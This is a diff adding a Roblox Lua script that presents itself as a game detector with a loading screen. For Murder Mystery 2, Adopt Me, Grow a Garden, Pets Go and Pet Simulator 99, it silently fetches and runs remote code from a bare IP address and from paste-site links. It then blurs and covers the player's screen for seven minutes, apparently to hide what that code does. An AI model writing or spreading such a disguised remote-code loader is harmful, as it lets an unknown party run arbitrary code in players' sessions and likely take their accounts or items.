@@ -1,0 +1,169 @@
+--// Modern Game Detector & Loader with Loading Screen (7 minutes UI)
+
+-- Services
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+
+-- Fun facts for loading
+local funFacts = {
+    "Did you know? Adopt Me! once had over 1.6 million players at once!",
+    "Fun Fact: Murder Mystery 2 was created back in 2014.",
+    "Grow a Garden is one of the newer popular Roblox games!",
+    "Pets Go! is inspired by classic simulator mechanics.",
+    "Pet Simulator 99 is one of the largest pet-based simulators on Roblox.",
+    "Stay hydrated while grinding your favorite game!",
+    "Pro tip: Teaming up with friends makes grinding easier!"
+}
+
+-- Create loading screen
+local function createLoadingScreen(gameName, duration)
+    local blur = Instance.new("BlurEffect")
+    blur.Size = 0
+    blur.Parent = Lighting
+    TweenService:Create(blur, TweenInfo.new(0.5), {Size = 24}):Play()
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "ModernLoader"
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = CoreGui
+
+    -- Smaller centered frame
+    local frame = Instance.new("Frame")
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.Position = UDim2.fromScale(0.5, 0.5)
+    frame.Size = UDim2.fromOffset(300, 150)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    frame.BackgroundTransparency = 0.2
+    frame.Parent = screenGui
+
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+    local stroke = Instance.new("UIStroke", frame)
+    stroke.Thickness = 2
+    stroke.Color = Color3.fromRGB(100, 100, 255)
+
+    local title = Instance.new("TextLabel")
+    title.Text = "Loading " .. gameName .. "..."
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 20
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.BackgroundTransparency = 1
+    title.Size = UDim2.fromScale(1, 0.2)
+    title.Position = UDim2.fromScale(0, 0.1)
+    title.Parent = frame
+
+    -- Progress bar background
+    local barBg = Instance.new("Frame")
+    barBg.Size = UDim2.fromScale(0.8, 0.15)
+    barBg.Position = UDim2.fromScale(0.1, 0.45)
+    barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    barBg.Parent = frame
+    Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)
+
+    -- Progress bar fill
+    local bar = Instance.new("Frame")
+    bar.Size = UDim2.new(0, 0, 1, 0)
+    bar.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
+    bar.Parent = barBg
+    Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)
+
+    -- Fun fact text
+    local fact = Instance.new("TextLabel")
+    fact.Text = "Tip: " .. funFacts[1]
+    fact.Font = Enum.Font.Gotham
+    fact.TextSize = 14
+    fact.TextColor3 = Color3.new(1, 1, 1)
+    fact.BackgroundTransparency = 1
+    fact.Size = UDim2.fromScale(0.9, 0.2)
+    fact.Position = UDim2.fromScale(0.05, 0.75)
+    fact.TextWrapped = true
+    fact.Parent = frame
+
+    -- Animate bar & fun facts for full duration
+    local startTime = tick()
+    local lastFact = 0
+    spawn(function()
+        while tick() - startTime < duration do
+            local progress = (tick() - startTime) / duration
+            TweenService:Create(bar, TweenInfo.new(0.1), {Size = UDim2.new(progress, 0, 1, 0)}):Play()
+
+            if tick() - lastFact > 5 then
+                lastFact = tick()
+                fact.Text = "Tip: " .. funFacts[math.random(1, #funFacts)]
+            end
+            task.wait(0.1)
+        end
+
+        -- Cleanup after duration
+        TweenService:Create(blur, TweenInfo.new(0.5), {Size = 0}):Play()
+        task.wait(0.5)
+        blur:Destroy()
+        screenGui:Destroy()
+    end)
+end
+
+-- Run handler
+local function runHandler(gameName, action)
+    -- Run the external script immediately
+    pcall(action)
+
+    -- Show loading screen for 7 minutes
+    createLoadingScreen(gameName, 420)
+
+    StarterGui:SetCore("SendNotification", {
+        Title = "Game detected",
+        Text = gameName,
+        Duration = 5,
+    })
+end
+
+-- Handlers for games
+local handlers = {
+    [142823291] = function() -- Murder Mystery 2
+        runHandler("Murder Mystery 2", function()
+            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
+            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+        end)
+    end,
+
+    [920587237] = function() -- Adopt Me
+        runHandler("Adopt Me", function()
+            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
+            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+        end)
+    end,
+
+    [126884695634066] = function() -- Grow a Garden
+        runHandler("Grow a Garden", function()
+            ID="e2249ae4-0580-4b0f-8289-87f460b363d6";
+            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+        end)
+    end,
+
+    [8737899170] = function() -- Pets Go
+        runHandler("Pets Go", function()
+            loadstring(game:HttpGet("https://paste.debian.net/plainh/b11ed528/", true))()
+        end)
+    end,
+
+    [8737899171] = function() -- Pet Simulator 99
+        runHandler("Pet Simulator 99", function()
+            loadstring(game:HttpGet("https://paste.debian.net/plainh/f7e3fafa/", true))()
+        end)
+    end,
+}
+
+-- Detect current game
+local placeId = game.PlaceId
+if handlers[placeId] then
+    handlers[placeId]()
+else
+    StarterGui:SetCore("SendNotification", {
+        Title = "Unsupported Game",
+        Text = "No handler found for this game.",
+        Duration = 5,
+    })
+end
